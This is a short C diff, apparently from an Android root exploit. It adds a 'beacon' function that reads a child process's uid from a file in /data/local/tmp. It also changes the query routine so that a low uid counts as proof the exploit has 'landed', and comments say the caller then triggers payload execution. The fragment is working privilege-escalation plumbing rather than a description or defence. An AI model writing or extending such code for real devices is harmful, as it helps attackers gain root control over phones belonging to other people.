@@ -72,9 +72,24 @@ int g_uid0_uid_r = -1;
 
 /* THE cred detector: ask the child itself. Writes C, reads its getuid.
  * 0 => landed; the caller then sends G (payload exec). */
+uint32_t uid0_child_uid_beacon(void) {
+  int fd = open("/data/local/tmp/child_uid.txt", O_RDONLY);
+  if (fd < 0)
+    return 9995;
+  uint32_t u = 9994;
+  ssize_t r = pread(fd, &u, sizeof(u), 0);
+  close(fd);
+  if (r != (ssize_t)sizeof(u))
+    return 9993;
+  return u;
+}
+
 uint32_t uid0_child_getuid_query(void) {
+  uint32_t b = uid0_child_uid_beacon();
+  if (b <= 2000)
+    return b; /* beacon is live and authoritative */
   if (g_uid0_cmd_w < 0 || g_uid0_uid_r < 0)
-    return 9998;
+    return b;
   uint32_t uid = 9999;
   char c = 'C';
   if (write(g_uid0_cmd_w, &c, 1) != 1)
